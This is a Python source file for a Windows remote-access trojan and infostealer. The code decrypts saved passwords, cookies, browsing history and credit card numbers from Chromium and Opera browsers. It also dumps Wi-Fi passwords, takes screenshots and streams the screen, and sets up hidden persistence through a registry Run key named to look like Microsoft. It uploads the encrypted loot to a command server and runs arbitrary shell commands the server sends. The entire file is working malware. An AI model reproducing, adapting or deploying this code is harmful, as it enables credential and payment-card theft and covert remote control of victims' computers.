from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import subprocess
import threading
import time
from PIL import ImageGrab
import os
import ctypes
import base64
import wmi
import ctypes
import psutil
import uuid
import re
import requests
from Crypto.Cipher import AES
from zipfile import ZipFile
import sqlite3
import shutil
from pathlib import Path
from win32crypt import CryptUnprotectData
import psutil
import json
from cryptography.fernet import Fernet


fernet_key = b'your fernet key value'

server_public_key_str ='''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsvgfMYZR0jXlA4j1GFM/
hMKuyjoBdjucagVP1U9nppcCG7AWt3AFCs4lAgxx8PTIXiAf5ixOlsXDGmFw3dcf
rkkoElmMSK3Uy0vcMQqOBpXGjib1hbLmxEShdBjhz4KrQe7ij5l+a4k3TnzCJkDS
JP76UD+YaITqDdQ8LmbMc4sa62Eqz8lMa1x0kElgFzgZ8ej/59LqPC8HEQpGL8DS
9gfPbg+DCBSQADLiNf87ThVaDB/WlfuN6XLT7tzJwlYMXTVkFsgm8WzefY+Uflwo
VDkNSqC4Rj9AZiRolmJm55o75OoaJz6TJ/onPruvh3sPKhU4psYwosDHTkGS3XOw
9QIDAQAB
-----END PUBLIC KEY-----
'''
def user_data():
        def display_name() -> str:
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3

            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)

            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)

            return nameBuffer.value

        display_name = display_name()
        hostname = os.getenv('COMPUTERNAME')
        username = os.getenv('USERNAME')

        return (
            ":bust_in_silhouette: User",
            f"```Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}```",
            False
        )

def system_data():
    def get_hwid() -> str:
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        return hwid

    cpu = wmi.WMI().Win32_Processor()[0].Name
    gpu = wmi.WMI().Win32_VideoController()[0].Name
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                0].TotalVisibleMemorySize) / 1048576, 0)
    hwid = get_hwid()

    return (
        "<:CPU:1004131852208066701> System",
        f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```",
        False
    )

def disk_data():
    disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
    for part in psutil.disk_partitions(all=False):
        if os.name == 'nt':
            if 'cdrom' in part.opts or part.fstype == '':
                continue
        usage = psutil.disk_usage(part.mountpoint)
        disk += ("{:<9} "*4).format(part.device, str(
            usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"

    return (
        ":floppy_disk: Disk",
        f"```{disk}```",
        False
    )
def network_data():
        def geolocation(ip: str) -> str:
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
            data = response.json()

            return (data["country"], data["regionName"], data["city"], data["zip"], data["as"])

        ip = requests.get("https://api.ipify.org").text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        country, region, city, zip_, as_ = geolocation(ip)

        return (
            ":satellite: Network",
            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```".format(
                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
            False
        )

def wifi_data():
    networks, out = [], ''
    try:
        wifi = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'], shell=True,
            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
        wifi = [i.split(":")[1][1:-1]
                for i in wifi if "All User Profile" in i]

        for name in wifi:
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1]
                            for b in results if "Key Content" in b]
            except subprocess.CalledProcessError:
                networks.append((name, ''))
                continue

            try:
                networks.append((name, results[0]))
            except IndexError:
                networks.append((name, ''))

    except subprocess.CalledProcessError:
        pass

    out += f'{"SSID":<20}| {"PASSWORD":<}\n'
    out += f'{"-"*20}|{"-"*29}\n'
    for name, password in networks:
        out += '{:<20}| {:<}\n'.format(name, password)

    return (
        ":signal_strength: WiFi",
        f"```{out}```",
        False
    )

__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []


class Browsers:
    def __init__(self, server_address):
        self.server_address = server_address

        Chromium()
        Opera()
        Upload(server_address)


class Types:
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

        def __str__(self):
            return f'{self.url}\t{self.username}\t{self.password}'

        def __repr__(self):
            return self.__str__()

    class Cookie:
        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

        def __str__(self):
            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

        def __repr__(self):
            return self.__str__()

    class WebHistory:
        def __init__(self, url, title, timestamp):
            self.url = url
            self.title = title
            self.timestamp = timestamp

        def __str__(self):
            return f'{self.url}\t{self.title}\t{self.timestamp}'

        def __repr__(self):
            return self.__str__()

    class Download:
        def __init__(self, tab_url, target_path):
            self.tab_url = tab_url
            self.target_path = target_path

        def __str__(self):
            return f'{self.tab_url}\t{self.target_path}'

        def __repr__(self):
            return self.__str__()

    class CreditCard:
        def __init__(self, name, month, year, number, date_modified):
            self.name = name
            self.month = month
            self.year = year
            self.number = number
            self.date_modified = date_modified

        def __str__(self):
            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

        def __repr__(self):
            return self.__str__()
            


class Chromium:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                operations = [
                    self.get_login_data,
                    self.get_cookies,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:
                        pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        conn.close()
        os.remove('login_db')

    def get_cookies(self, path: str, profile: str):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        shutil.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = self.decrypt_password(row[3], self.master_key)
            __COOKIES__.append(Types.Cookie(
                row[0], row[1], row[2], cookie, row[4]))

        conn.close()
        os.remove('cookie_db')

    def get_web_history(self, path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        conn.close()
        os.remove('web_history_db')

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str, profile: str):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            __CARDS__.append(Types.CreditCard(
                row[0], row[1], row[2], card_number, row[4]))

        conn.close()
        os.remove('cards_db')


class Opera:
    def __init__(self) -> None:
        self.roaming = os.getenv("APPDATA")
        self.paths = {
            'operagx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'opera': self.roaming + '\\Opera Software\\Opera Stable'
        }

        for _, path, in self.paths.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            operations = [
                self.get_login_data,
                self.get_cookies,
                self.get_web_history,
                self.get_downloads,
                self.get_credit_cards
            ]

            for operation in operations:
                try:
                    operation(path)
                except Exception as e:
                    pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str) -> None:
        login_db = f'{path}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute(
            "SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        cursor.close()
        conn.close()
        os.remove('login_db')

    def get_cookies(self, path: str) -> None:
        cookies_db = f'{path}\\Network\\Cookies'
        if not os.path.exists(cookies_db):
            return

        shutil.copy(cookies_db, 'cookies_db')
        conn = sqlite3.connect('cookies_db')
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute(
            'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = self.decrypt_password(row[3], self.master_key)

            row = [x.decode('latin-1') if isinstance(x, bytes)
                   else x for x in row]
            __COOKIES__.append(Types.Cookie(
                row[0], row[1], row[2], cookie, row[4]))

        cursor.close()
        conn.close()
        os.remove('cookies_db')

    def get_web_history(self, path: str) -> None:
        history_db = f'{path}\\History'
        if not os.path.exists(history_db):
            return

        shutil.copy(history_db, 'history_db')
        conn = sqlite3.connect('history_db')
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        cursor.close()
        conn.close()
        os.remove('history_db')

    def get_downloads(self, path: str) -> None:
        downloads_db = f'{path}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        cursor.close()
        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str) -> None:
        cards_db = f'{path}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3] or not row[4]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            __CARDS__.append(Types.CreditCard(
                row[0], row[1], row[2], card_number, row[4]))

        cursor.close()
        conn.close()
        os.remove('cards_db')

class Upload:
    def __init__(self, server_address):
        
        self.server_address = server_address

        self.write_files()
        self.send()
        self.clean()

    def write_files(self):
        os.makedirs("Harvest", exist_ok=True)
        if __LOGINS__:
            with open("Harvest\\logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("Harvest\\cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("Harvest\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("Harvest\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("Harvest\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile("Harvest.zip", "w") as zip:
            for file in os.listdir("Harvest"):
                zip.write(f"Harvest\\{file}", file)

    
    def send(self):
        fernet_key = b'saEPhdTYsxeDrgNSG3S-wb0TBrZax2Q-p_T8igYq-KQ='
        with open('Harvest.zip', 'rb') as zip_file:
            zip_content = zip_file.read()
            encrypted_zip_content = encrypt_file(zip_content, fernet_key)

        files = {'file': ('Harvest.zip', encrypted_zip_content, 'application/octet-stream')}
        requests.post(self.server_address, files=files)
       

    def clean(self):
        shutil.rmtree("Harvest")
        os.remove("Harvest.zip")
    

def Exec(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output.decode("utf-8")
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"


def encrypt_file(data, key):
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    return encrypted_data

def collect_and_send_system_info():
    user_info = user_data()
    system_info = system_data()
    disk_info = disk_data()
    network_info = network_data()
    wifi_info = wifi_data()

    data = {
        "user_info": user_info,
        "system_info": system_info,
        "disk_info": disk_info,
        "network_info": network_info,
        "wifi_info": wifi_info,
    }

    return data
    

def steal(server_address):
    __CONFIG__ = {
        'server_address': server_address,
        'browsers': True
    }

    funcs = [Browsers, Upload]

    for func in funcs:
        func_name = func.__name__.lower()
        if func_name in __CONFIG__ and __CONFIG__[func_name]:
            func(__CONFIG__['server_address'])

screen_share_active = False


def start():
    
    key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    value_name = "Microsft-Eos"
    startup=True

    try:
        # Run the reg query command to check if the registry value exists
        result = subprocess.run(["reg", "query", key, "/v", value_name], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = result.stdout.decode().strip()
        if output:
            startup=True
        else:
            startup=False
    except subprocess.CalledProcessError:
        
        startup=False
        
        
    if startup==False:
        path = os.path.abspath(__file__)

        

        home_directory = os.path.expanduser("~")

        
        batch_file_path = os.path.join(home_directory, 'Eos.bat')

    
        vbs_script_path = os.path.join(home_directory, 'EOS.vbs')

    
        vbs_script_content = f'''
        Set objShell = CreateObject("WScript.Shell")


        batchFilePath = "{batch_file_path}"


        objShell.Run batchFilePath, 0, True
        '''


        command=f'''@echo off 
        start {path}
        '''
        try:
            with open(batch_file_path, 'w') as batch_file:
                batch_file.write(command)
            with open(vbs_script_path, 'w') as vbs_script:
                vbs_script.write(vbs_script_content)
            subprocess.run(['attrib', '+h', batch_file_path], shell=True)
            subprocess.run(['attrib', '+h', vbs_script_path], shell=True)
            
            subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            "/v", "Microsft-Eos", "/t", "REG_SZ", "/d", f"{vbs_script_path}", "/f"], shell=True)
        
            
        
            
        except subprocess.CalledProcessError as e:
            return("Error start:", e)
def start_screen_share(server_address):
    while screen_share_active:
        capture_and_send_screenshot(server_address)
        
        time.sleep(1)

def stop_screen_share():
    global screen_share_thread
    global screen_share_active
    if screen_share_thread:
       
        screen_share_thread.join()  
        screen_share_thread = None  


def start_screen_share_thread(server_address):
    global screen_share_thread
    screen_share_thread = threading.Thread(target=start_screen_share, args=(server_address,))
    screen_share_thread.start()


def capture_and_send_screenshot(server_address):
    global fernet_key
    filename = f"screenshot.jpg"
    

    
    image = ImageGrab.grab()
    
    
    image.save(filename, 'JPEG')

    
    with open(filename, 'rb') as screenshot_file:
        screenshot_content = screenshot_file.read()
    os.remove(filename)
    
    encrypted_screenshot_content = encrypt_file(screenshot_content, fernet_key)

   
    files = {'file': (filename, encrypted_screenshot_content, 'application/octet-stream')}
    requests.post(server_address + "/upload", files=files)
    

    
    
    return server_address + "/uploaded_files/" + filename



def exec_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output.decode("utf-8").strip()
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"
    
def encrypt_data( data):
    
    global server_public_key_str

    server_public_key = bytes(server_public_key_str, 'utf-8')

   
    key = RSA.import_key(server_public_key)
    cipher = PKCS1_OAEP.new(key)
    encrypted_data = cipher.encrypt(data.encode('utf-8'))
    return encrypted_data

def send_data_to_server(server_address,  data):
    try:
       
        encrypted_data = encrypt_data( data)

       
        response = requests.post(server_address, json={"result": encrypted_data.hex()})
        return f"Data sent successfully. Server responded with status code: {response.status_code}"
    except Exception as e:
        return f"Failed to send data to server. Error: {e}"

def check_for_commands(server_address, client_id):
    try:
        response = requests.get(f"{server_address}/commands/{client_id}", timeout=5)
        response.raise_for_status()
        return response.json().get("commands", [])
    except requests.exceptions.RequestException:
        return []
def check_server_status(server_address):
    try:
        response = requests.head(server_address, timeout=5)
        return response.status_code == 200  # Server is up if response status is 200 OK
    except requests.RequestException:
        return False

def execute_commands(commands, server_address):
    
    global screen_share_active
    for cmd in commands:
        if cmd == "info":
             
            result=collect_and_send_system_info()
        elif cmd == "screenshare":
            if not screen_share_active:
                screen_share_active = True
                result = "Screen sharing started check /theShow . Use 'stopshare' to end screen sharing."
                start_screen_share_thread(server_address)
            else:
                result = "Screen sharing is already active."

        elif cmd == "stopshare":
            if screen_share_active:
                screen_share_active = False
                result = "Screen sharing stopped."
                stop_screen_share()
            else:
                result = "No active screen sharing to stop."
        elif cmd == "screenshot":
            
            unique_id = str(uuid.uuid4())[:8]
            timestamp = time.strftime("%Y%m%d%H%M%S")
            filename = f"screenshot_{timestamp}_{unique_id}.jpg"
            global fernet_key

            
            image = ImageGrab.grab()
            
            image.save(filename, 'JPEG')

            
            with open(filename, 'rb') as screenshot_file:
                screenshot_content = screenshot_file.read()
            os.remove(filename)
            
            encrypted_screenshot_content = encrypt_file(screenshot_content, fernet_key)

           
            files = {'file': (filename, encrypted_screenshot_content, 'application/octet-stream')}
            requests.post(server_address + "/upload", files=files)
            
            result=server_address + "/uploaded_files/"+filename
        elif cmd == "steal":
            
            steal(server_address + "/upload")
            result="Harvest Done check Harvest."
        elif cmd.startswith("sleep"):
            try:
                _, duration = cmd.split() 
                duration = int(duration)  
                result=f"Sleeping for {duration} seconds..."
                time.sleep(duration)  
                
            except ValueError:
                result = "Error: Invalid sleep duration"
        else:

            result = exec_cmd(cmd)
        
    return result

CLIENT_ID_FILE = ".client_id.txt"  

def generate_client_id():
    
    return str(uuid.uuid4())

def read_or_generate_client_id():
    
    if os.path.exists(CLIENT_ID_FILE):
        with open(CLIENT_ID_FILE, "r") as file:
            return file.read().strip()
    else:
        client_id = generate_client_id()
        with open(CLIENT_ID_FILE, "w") as file:
            file.write(client_id)
        return client_id


def send_client_id(server_address, client_id):
   
    data = {"client_id": client_id}
    while True:
        try:
            response = requests.post(f"{server_address}/register", json=data)
            response.raise_for_status()
            return f"Client registered successfully. Server responded with status code: {response.status_code}"
        except requests.exceptions.RequestException as e:
            
            time.sleep(10)
